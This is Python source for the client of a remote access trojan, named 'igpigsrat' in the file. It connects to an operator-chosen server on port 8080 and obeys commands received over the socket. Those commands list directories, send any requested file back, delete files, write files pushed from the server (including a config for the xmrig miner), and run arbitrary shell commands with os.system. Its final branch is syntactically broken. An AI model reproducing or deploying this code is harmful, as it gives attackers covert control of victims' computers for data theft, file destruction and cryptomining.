import os
import socket


s = socket.socket()
port=8080
host = input(str("please enter the server address : "))
s.connect((host,port))
buf = 1024
print("")
print("Connect to the server successfully")
print("")
RAT = open("igpigsrat.txt", "rt")
contents = RAT.read()
RAT.close()
print(contents)
print("")
print("")
print("")





while 1 :
    command = s.recv(1024)
    command = command.decode()
    print("command recieved")
    print("")
    if command == "view_cwd":
        files = os.getcwd()
        files = str(files)
        s.send(files.encode())
        print("Command has been executed successfully..")
        

    elif command == "custom_dir":
            user_input = s.recv(5000)
            user_input = user_input.decode()
            files = os.listdir(user_input)
            files = str(files)
            s.send(files.encode())
            print("")
            print("command has been executed successfully..")


    elif command == "download_file":
           file_path = s.recv(500000)
           file_path = file_path.decode()
           file = open(file_path, "rb")
           data = file.read()
           s.send(data)
           print("")
           print("file as been sent successfully")
           print("")


    elif command == "remove_file":
         fileanddir = s.recv(6000)
         fileanddir = fileanddir.decode()
         os.remove(fileanddir)
         print("")
         print("command has been executed successfully")

    
    elif command == "send_file":
        filename = s.recv(6000)
        print(filename)
        new_file = open(filename, "wb")
        data = s.recv(6000)
        print(data)
        new_file.write(data)
        new_file.close()

    
    elif command == "client_info":
       h_name = socket.gethostname()
       print(h_name)
       s.send(bytes(h_name.encode()))
       print("")
       print("command as been executed successfully")
       
    elif command == "exe_file":
        exe_path = s.recv(buf)
        exepath = exe_path.decode()
        os.system(exepath)
        print("")
        print("command as been executed successfully")
    
    elif command == "cmd":
       cmdpath = s.recv(buf)
       cmd = cmdpath.decode()
       os.system(cmd)
       print("")
       print("command as been executed successfully")
    
    
    
    elif command == "xmrig_config":
        filename = s.recv(6000)
        print(filename)
        new_file = open(filename, "wb")
        data = s.recv(6000)
        print(data)
        new_file.write(data)
        new_file.close()
    
    
    elif command == "config_test":
        l = s.recv(1024)
        
        while (l):
         1.write(l)
         l = s.recv(1024)

 
